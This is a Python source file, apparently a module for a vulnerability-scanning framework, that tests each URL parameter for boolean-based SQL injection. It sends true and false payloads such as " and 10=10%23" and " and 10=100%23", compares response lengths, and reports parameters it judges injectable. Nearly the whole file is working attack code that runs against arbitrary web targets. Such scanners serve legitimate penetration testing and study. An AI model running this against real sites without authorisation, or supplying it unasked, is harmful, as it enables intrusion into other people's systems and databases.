#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import requests
sys.path.append("..")#先跳到上级目录下
sys.dont_write_bytecode = True#不生成pyc文件
from poc import Poc

class Get_sql(Poc):
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0'
    }

    def scan(self,url):
        print('[Scan]' + url + '...')
        params = url.split('?')[1].split('&')
        try:
            origin = len(requests.get(url,timeout=1,headers=self.header).text)
            for i in params:
                if self.sqlFalse(url,origin,i):
                    if self.sqlTrue(url,origin,i):
                        print('[!!] Find Injection：'+ url+' Param: '+i)
        except:
            print("[-]Connetcion Error!")

    #输出正常的SQL注入语句
    def sqlTrue(self,url,origin,param):
        payload = [' and 10=10%23','%23','%0A','\'%23']
        right_count = 0
        for i in payload:
            length = len(requests.get(url.replace(param,param+i),timeout=0.5,headers=self.header).text)
            if origin-30 <= length <= origin+30:
                right_count += 1
        print("True: "+str(right_count))
        if right_count >= 2:
            return 1
        return 0

    #输出错误的SQL注入语句
    def sqlFalse(self,url,origin,param):
        payload = ['a',' and 10=100%23','\'']
        error_count = 0
        for i in payload:
            length = len(requests.get(url.replace(param,param+i),timeout=0.5,headers=self.header).text)
            #print(url.replace(param,param+i))
            if length != origin:
                error_count += 1
        print("False: "+str(error_count))
        if error_count >= 2:
            return 1
        return 0
